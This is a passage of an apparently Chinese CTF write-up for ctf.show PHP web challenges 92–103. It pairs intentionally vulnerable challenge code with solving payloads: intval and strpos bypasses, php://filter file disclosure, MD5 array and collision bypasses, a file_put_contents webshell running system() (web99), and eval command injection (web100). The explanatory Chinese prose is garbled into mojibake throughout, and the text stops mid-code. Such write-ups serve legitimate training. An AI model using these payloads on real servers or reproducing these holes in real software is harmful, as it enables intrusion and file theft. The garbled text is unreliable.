åŒæ—¶ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºç²¾ç¡®åŒ¹é…ï¼Œéœ€è¦åŒ¹é…ä»¥phpå¼€å¤´å’Œä»¥phpç»“å°¾<br>&#x2F;m å¤šè¡ŒåŒ¹é… è‹¥å­˜åœ¨æ¢è¡Œ\nå¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œå°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…<br>ä½†æ˜¯å½“å‡ºç°æ¢è¡Œç¬¦ <code>%0a</code>çš„æ—¶å€™ï¼Œ$cmdçš„å€¼ä¼šè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œè€Œæ­¤æ—¶ç¬¬äºŒä¸ªifæ­£åˆ™åŒ¹é…ä¸ç¬¦åˆä»¥phpå¼€å¤´å’Œä»¥phpç»“å°¾</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=php%0a1</span><br></pre></td></tr></table></figure><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num=0x117c</span><br></pre></td></tr></table></figure><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8è¿›åˆ¶æˆ–è€…å°æ•°ç‚¹éƒ½å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num=010574</span><br><span class="line">/?num=4476.1</span><br></pre></td></tr></table></figure><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨å…«è¿›åˆ¶ï¼Œç„¶åå‰é¢åŠ ä¸ªç©ºæ ¼ä½¿å¾—ç¬¬ä¸€ä¸ª0çš„ä½ç½®å˜ä¸º1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num= 010574</span><br></pre></td></tr></table></figure><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num= 010574</span><br></pre></td></tr></table></figure><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?u=/var/www/html/flag.php</span><br><span class="line">/?u=./flag.php</span><br><span class="line">/?u=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ•°ç»„ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>md5ç¢°æ’</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b4cc0806-d909-40ae-9f32-395f4eab09ad.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>627</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">a=<span class="meta">%</span>D<span class="number">89</span><span class="meta">%</span>A<span class="number">4</span><span class="meta">%</span>FD<span class="meta">%</span><span class="number">14</span><span class="meta">%</span>EC<span class="meta">%</span><span class="number">0</span>EL<span class="meta">%</span><span class="number">1</span>A<span class="meta">%</span>FEG<span class="meta">%</span>ED<span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span>D<span class="number">0</span><span class="meta">%</span>C<span class="number">0</span><span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span>CAh<span class="meta">%</span><span class="number">16</span><span class="meta">%</span>B<span class="number">4</span><span class="meta">%</span>DFl<span class="meta">%</span><span class="number">08</span>Z<span class="meta">%</span>FA<span class="meta">%</span><span class="number">1</span>DA<span class="meta">%</span><span class="number">05</span>i<span class="meta">%</span><span class="number">29</span><span class="meta">%</span>C<span class="number">4</span><span class="meta">%</span>FF<span class="meta">%</span><span class="number">80</span><span class="meta">%</span><span class="number">11</span><span class="meta">%</span><span class="number">14</span><span class="meta">%</span>E<span class="number">8</span>jk<span class="number">5</span><span class="meta">%</span><span class="number">0</span>DK<span class="meta">%</span>DAa<span class="meta">%</span>FC<span class="meta">%</span><span class="number">2</span>B<span class="meta">%</span>DC<span class="meta">%</span><span class="number">9</span>F<span class="meta">%</span><span class="number">95</span>ab<span class="meta">%</span>D<span class="number">2</span><span class="meta">%</span><span class="number">09</span>P<span class="meta">%</span>A<span class="number">1</span><span class="meta">%</span><span class="number">5</span>D<span class="meta">%</span><span class="number">12</span><span class="meta">%</span><span class="number">3</span>B<span class="meta">%</span><span class="number">1</span>ETZ<span class="meta">%</span>AA<span class="meta">%</span><span class="number">92</span><span class="meta">%</span><span class="number">16</span>y<span class="meta">%</span><span class="number">29</span><span class="meta">%</span>CC<span class="meta">%</span><span class="number">7</span>DV<span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span>FF<span class="meta">%</span>B<span class="number">8</span>e<span class="meta">%</span><span class="number">7</span>FK<span class="meta">%</span>D<span class="number">6</span><span class="meta">%</span>CD<span class="meta">%</span><span class="number">1</span>D<span class="meta">%</span>DF/a<span class="meta">%</span>DE<span class="meta">%</span><span class="number">27</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span>EF<span class="meta">%</span><span class="number">08</span><span class="meta">%</span>FC<span class="meta">%</span>C<span class="number">0</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span>D<span class="number">1</span><span class="meta">%</span><span class="number">1</span>B<span class="meta">%</span><span class="number">14</span><span class="meta">%</span>C<span class="number">1</span>LYy<span class="meta">%</span>B<span class="number">2</span><span class="meta">%</span>F<span class="number">9</span><span class="meta">%</span><span class="number">88</span><span class="meta">%</span>DF<span class="meta">%</span>E<span class="number">2</span><span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span><span class="number">9</span>E<span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span><span class="number">04</span>c<span class="meta">%</span>B<span class="number">1</span><span class="meta">%</span>B<span class="number">0</span><span class="meta">%</span>AFj<span class="meta">%</span><span class="number">1</span>E<span class="meta">%</span><span class="number">7</span>Ch<span class="meta">%</span>B<span class="number">0</span><span class="meta">%</span><span class="number">96</span><span class="meta">%</span>A<span class="number">7</span><span class="meta">%</span>E<span class="number">5</span>U<span class="meta">%</span>EB<span class="symbol">n1</span>q<span class="meta">%</span>CA<span class="meta">%</span>D<span class="number">0</span><span class="meta">%</span><span class="number">8</span>B<span class="meta">%</span>C<span class="number">7</span><span class="meta">%</span><span class="number">1</span>BSP&amp;b=<span class="meta">%</span>D<span class="number">89</span><span class="meta">%</span>A<span class="number">4</span><span class="meta">%</span>FD<span class="meta">%</span><span class="number">14</span><span class="meta">%</span>EC<span class="meta">%</span><span class="number">0</span>EL<span class="meta">%</span><span class="number">1</span>A<span class="meta">%</span>FEG<span class="meta">%</span>ED<span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span>D<span class="number">0</span><span class="meta">%</span>C<span class="number">0</span><span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span>CAh<span class="meta">%</span><span class="number">164</span><span class="meta">%</span>DFl<span class="meta">%</span><span class="number">08</span>Z<span class="meta">%</span>FA<span class="meta">%</span><span class="number">1</span>DA<span class="meta">%</span><span class="number">05</span>i<span class="meta">%</span><span class="number">29</span><span class="meta">%</span>C<span class="number">4</span><span class="meta">%</span>FF<span class="meta">%</span><span class="number">80</span><span class="meta">%</span><span class="number">11</span><span class="meta">%</span><span class="number">14</span><span class="meta">%</span>E<span class="number">8</span>jk<span class="number">5</span><span class="meta">%</span><span class="number">0</span>DK<span class="meta">%</span>DAa<span class="meta">%</span>FC<span class="meta">%</span><span class="number">2</span>B<span class="meta">%</span><span class="number">5</span>C<span class="meta">%</span>A<span class="number">0</span><span class="meta">%</span><span class="number">95</span>ab<span class="meta">%</span>D<span class="number">2</span><span class="meta">%</span><span class="number">09</span>P<span class="meta">%</span>A<span class="number">1</span><span class="meta">%</span><span class="number">5</span>D<span class="meta">%</span><span class="number">12</span><span class="meta">%</span><span class="number">3</span>B<span class="meta">%</span><span class="number">1</span>ET<span class="meta">%</span>DA<span class="meta">%</span>AA<span class="meta">%</span><span class="number">92</span><span class="meta">%</span><span class="number">16</span>y<span class="meta">%</span><span class="number">29</span><span class="meta">%</span>CC<span class="meta">%</span><span class="number">7</span>DV<span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span>FF<span class="meta">%</span>B<span class="number">8</span>e<span class="meta">%</span><span class="number">7</span>FK<span class="meta">%</span>D<span class="number">6</span><span class="meta">%</span>CD<span class="meta">%</span><span class="number">1</span>D<span class="meta">%</span>DF/a<span class="meta">%</span>DE<span class="meta">%</span><span class="number">27</span><span class="meta">%</span><span class="number">29</span>o<span class="meta">%</span><span class="number">08</span><span class="meta">%</span>FC<span class="meta">%</span>C<span class="number">0</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span>D<span class="number">1</span><span class="meta">%</span><span class="number">1</span>B<span class="meta">%</span><span class="number">14</span><span class="meta">%</span>C<span class="number">1</span>LYy<span class="meta">%</span>B<span class="number">2</span><span class="meta">%</span>F<span class="number">9</span><span class="meta">%</span><span class="number">88</span><span class="meta">%</span>DF<span class="meta">%</span>E<span class="number">2</span><span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span><span class="number">9</span>E<span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span><span class="number">04</span>c<span class="meta">%</span>B<span class="number">1</span><span class="meta">%</span>B<span class="number">0</span><span class="meta">%</span>AFj<span class="meta">%</span><span class="number">9</span>E<span class="meta">%</span><span class="number">7</span>Bh<span class="meta">%</span>B<span class="number">0</span><span class="meta">%</span><span class="number">96</span><span class="meta">%</span>A<span class="number">7</span><span class="meta">%</span>E<span class="number">5</span>U<span class="meta">%</span>EB<span class="symbol">n1</span>q<span class="meta">%</span>CA<span class="meta">%</span>D<span class="number">0</span><span class="meta">%</span><span class="number">0</span>B<span class="meta">%</span>C<span class="number">7</span><span class="meta">%</span><span class="number">1</span>BSP</span></span><br></pre></td></tr></table></figure><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?1=1</span><br><span class="line">POSTï¼šHTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>in_array()å‡½æ•°åœ¨æ²¡æœ‰ç¬¬ä¸‰ä¸ªå€¼å¾—æ—¶å€™ä¼šè¿›è¡Œå¼±æ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨å¼ºåˆ¶è½¬æ¢ï¼Œå³1.phpæ­¤æ—¶ä¼šè¢«è½¬æ¢ä¸º1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?n=1.php</span><br><span class="line">POSTï¼šcontent=&lt;?php system(&#x27;tac flag36d.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>&amp;&amp; &gt; || &gt; = &gt; and &gt; or</code>ï¼Œ&#x3D;çš„è¿ç®—ç¬¦æ¯”andé«˜ï¼Œå¯¹äºv0çš„å€¼åªéœ€è¦çœ‹v1å°±å¯ä»¥v2,v3æ˜¯å¹²æ‰°ï¼ˆ<code>0x2d</code>æ¢æˆ<code>-</code>ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v2=system(&#x27;cat ctfshow.php&#x27;)/*&amp;v3=*/;</span><br><span class="line">/?v1=1&amp;v2=print_r($ctfshow)/*&amp;v3=*/;</span><br><span class="line"></span><br><span class="line">/?v1=1&amp;v2=echo new ReflectionClass(&#x27;ctfshow&#x27;)/*&amp;v3=*/;</span><br><span class="line">/?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åå°„ç±»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><h3 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span 